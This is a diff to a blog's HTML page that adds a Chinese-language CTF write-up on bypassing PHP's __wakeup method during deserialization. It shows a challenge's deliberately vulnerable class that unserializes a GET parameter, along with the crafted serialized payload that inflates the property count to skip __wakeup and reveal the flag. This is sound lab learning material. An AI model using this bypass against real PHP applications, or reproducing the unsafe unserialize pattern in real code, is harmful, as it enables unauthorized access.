@@ -73,6 +73,57 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-CTF-php-0" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/02/29/CTF-php-0/" class="article-date">
+  <time class="dt-published" datetime="2024-02-29T09:17:22.000Z" itemprop="datePublished">2024-02-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/02/29/CTF-php-0/">CTF-php</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CTF-php-反序列化—2"><a href="#CTF-php-反序列化—2" class="headerlink" title="CTF-php 反序列化—2"></a>CTF-php 反序列化—2</h1><h2 id="wakeup魔术"><a href="#wakeup魔术" class="headerlink" title="wakeup魔术"></a>wakeup魔术</h2><p>题目链接：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/429">https://www.nssctf.cn/problem/429</a></p>
+<p>打开环境，查看代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;class.php&quot;);</span><br><span class="line"></span><br><span class="line">class HaHaHa&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public $admin;</span><br><span class="line">        public $passwd;</span><br><span class="line"></span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;admin =&quot;user&quot;;</span><br><span class="line">            $this-&gt;passwd = &quot;123456&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __wakeup()&#123;</span><br><span class="line">            $this-&gt;passwd = sha1($this-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function __destruct()&#123;</span><br><span class="line">            if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123;</span><br><span class="line">                include(&quot;flag.php&quot;);</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo $this-&gt;passwd;</span><br><span class="line">                echo &quot;No wake up&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$Letmeseesee = $_GET[&#x27;p&#x27;];</span><br><span class="line">unserialize($Letmeseesee);</span><br></pre></td></tr></table></figure>
+
+<p>本题之关键就是wakeup魔术方法<br>通过在 __wakeup 中修改敏感数据（密码）来防止滥用反序列化攻击，以保护系统的安全性。这个机制确保了只有当密码经过特定的哈希处理后才能触发获取敏感信息的条件。<br>所以想着绕过它</p>
+<p>我们原来输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:“HaHaHa”:2:&#123;s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:4:“wllm”;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>改为输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:“HaHaHa”:3:&#123;s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:4:“wllm”;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绕过wake只需要满足 php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup()所以将2改为3</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> <strong>wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过</strong><strong>wakeup的执行</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/29/CTF-php-0/" data-id="clt70q3re0000jsuo6p2o7kni" data-title="CTF-php" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-ctf-php" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2024/02/28/ctf-php/" class="article-date">
@@ -778,6 +829,10 @@
       <ul>
         
           <li>
+            <a href="/2024/02/29/CTF-php-0/">CTF-php</a>
+          </li>
+        
+          <li>
             <a href="/2024/02/28/ctf-php/">ctf-php</a>
           </li>
         
@@ -791,10 +846,6 @@
         
           <li>
             <a href="/2023/11/12/Computer-science-2/">Computer science(2)</a>
-          </li>
-        
-          <li>
-            <a href="/2023/11/02/Computer-Science-0/">Computer Science</a>
           </li>
         
       </ul>
